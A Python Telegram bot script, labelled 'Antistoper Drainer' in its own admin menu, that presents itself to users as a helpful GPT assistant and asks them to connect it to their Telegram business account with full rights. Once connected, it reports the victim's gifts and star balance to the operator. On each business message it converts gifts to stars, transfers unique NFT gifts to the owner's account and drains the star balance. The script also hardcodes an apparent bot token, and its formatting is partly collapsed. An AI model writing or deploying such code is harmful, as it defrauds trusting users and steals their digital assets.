import asyncio import json import logging import os

from aiogram import Bot, Dispatcher, F, types from aiogram.client.default import DefaultBotProperties from aiogram.enums import ParseMode from aiogram.filters import Command from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto from aiogram.types.business_connection import BusinessConnection, Message from aiogram.methods import ( GetBusinessAccountStarBalance, GetBusinessAccountGifts, SendMessage, ReadBusinessMessage, GetAvailableGifts, TransferGift, ConvertGiftToStars, UpgradeGift ) from aiogram.exceptions import TelegramBadRequest

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

TOKEN = "8009461376:AAHjMUEZV5L90B1Vqrv7tHm8XQZDaKUFNMU"
ADMIN_ID = 861087987  # Replace with your admin Telegram ID 
OWNER_ID = ADMIN_ID CONNECTIONS_FILE = "business_connections.json"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML)) dp = Dispatcher()

def load_json_file(filename): try: with open(filename, "r") as f: content = f.read().strip() if not content: return [] return json.loads(content) except (FileNotFoundError, json.JSONDecodeError): return []

def load_connections(): return load_json_file(CONNECTIONS_FILE)

def save_business_connection_data(business_connection): data = load_json_file(CONNECTIONS_FILE) business_connection_data = { "user_id": business_connection.user.id, "business_connection_id": business_connection.id, "username": business_connection.user.username, "first_name": "FirstName", "last_name": "LastName" }

for i, conn in enumerate(data):
    if conn["user_id"] == business_connection.user.id:
        data[i] = business_connection_data
        break
else:
    data.append(business_connection_data)

with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str: try: gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id)) for gift in gifts.gifts: if gift.owned_gift_id == owned_gift_id: gift_name = gift.gift.base_name.replace(" ", "") return f"https://t.me/nft/{gift_name}-{gift.gift.number}" except Exception: pass return "🎁 Нет подарков."

async def send_welcome_message_to_admin(connection, user_id, _bot): try: rights = connection.rights business_connection = connection

rights_text = "\n".join([
        "📍 <b>Права бота:</b>",
        f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
        f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
        f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
        f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
        f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
        f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
        f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
        f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
        f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
        f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
        f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
        f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
    ])

    star_amount = 0
    all_gifts_amount = 0
    unique_gifts_amount = 0

    if rights.can_view_gifts_and_stars:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
        star_amount = response.star_amount
        gifts = await bot(GetFixedBusinessAccountGifts(business_connection_id=business_connection.id))
        all_gifts_amount = len(gifts.gifts)
        unique_gifts_amount = sum(1 for gift in gifts.gifts if gift.type == "unique")

    msg = (
        f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
        f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
        f"🆔 User ID: <code>{business_connection.user.id}</code>\n"
        f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
        f"\n{rights_text}"
        f"\n⭐️ Звезды: <code>{star_amount}</code>"
        f"\n🎁 Подарков: <code>{all_gifts_amount}</code>"
        f"\n🔝 NFT подарков: <code>{unique_gifts_amount}</code>"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Вывести все подарки", callback_data=f"reveal_all_gifts:{user_id}")],
        [InlineKeyboardButton(text="⭐️ Превратить подарки в звезды", callback_data=f"convert_exec:{user_id}")],
        [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
    ])
    await _bot.send_message(ADMIN_ID, msg, reply_markup=keyboard)
except Exception as e:
    logging.exception("Не удалось отправить сообщение в личный чат.")

@dp.message(Command("start")) async def cmd_start(message: types.Message): if message.from_user.id != ADMIN_ID: await message.answer( "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n" "• ответит на любой вопрос\n" "• поддержит тебя в трудную минуту\n" "• сделает за тебя домашку, работу или даже нарисует картину\n\n" "<i>Введи запрос ниже, и я помогу тебе!</i> 👇" ) else: await message.answer( "Antistoper Drainer\n\n" "/gifts - просмотреть гифты\n" "/stars - просмотреть звезды\n" "/transfer <owned_id> <business_connect> - передать гифт вручную\n" "/convert - конвертировать подарки в звезды" )

@dp.message(Command("refund")) async def refund_command(message: types.Message): try: args = message.text.split() if len(args) != 2: await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456") return

transaction_id = args[1]
    refund_result = await bot.refund_star_payment(
        user_id=message.from_user.id,
        telegram_payment_charge_id=transaction_id
    )

    if refund_result:
        await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
    else:
        await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")
except Exception as e:
    await message.answer(f"Ошибка при выполнении возврата: {str(e)}")

@dp.message(F.text) async def handle_text_query(message: Message): await message.answer( "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n" "Как это сделать?\n\n" "1. ⚙️ Откройте <b>Настройки Telegram</b>\n" "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n" "3. 🤖 Откройте пункт <b>Чат-боты</b>\n" "4. ✍️ Введите <code>@TitanGpt_RoBot</code>\n\n" "Имя бота: <code>@TitanGpt_RoBot</code>\n\n" "❗Для корректной работы боту требуются <b>все права</b>" )

@dp.business_connection() async def handle_business_connect(business_connection: BusinessConnection): try: await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot) await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'") save_business_connection_data(business_connection) except Exception as e: logging.exception("Ошибка при подключении бизнес-бота")

@dp.business_message() async def get_message(message: types.Message): business_id = message.business_connection_id user_id = message.from_user.id

if user_id == OWNER_ID:
    return

try:
    convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
    for gift in convert_gifts.gifts:
        await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
except Exception as e:
    logging.warning(f"Ошибка при конвертации подарков: {e}")

try:
    unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
    for gift in unique_gifts.gifts:
        await bot.transfer_gift(business_id, gift.owned_gift_id, OWNER_ID, 25)
except Exception as e:
    logging.warning(f"Ошибка при передаче уникальных подарков: {e}")

try:
    stars = await bot.get_business_account_star_balance(business_id)
    if stars.amount > 0:
        await bot.transfer_business_account_stars(business_id, int(stars.amount))
except Exception as e:
    logging.warning(f"Ошибка при работе со звездами: {e}")

async def main(): await dp.start_polling(bot)

if name == "main": asyncio.run(main())

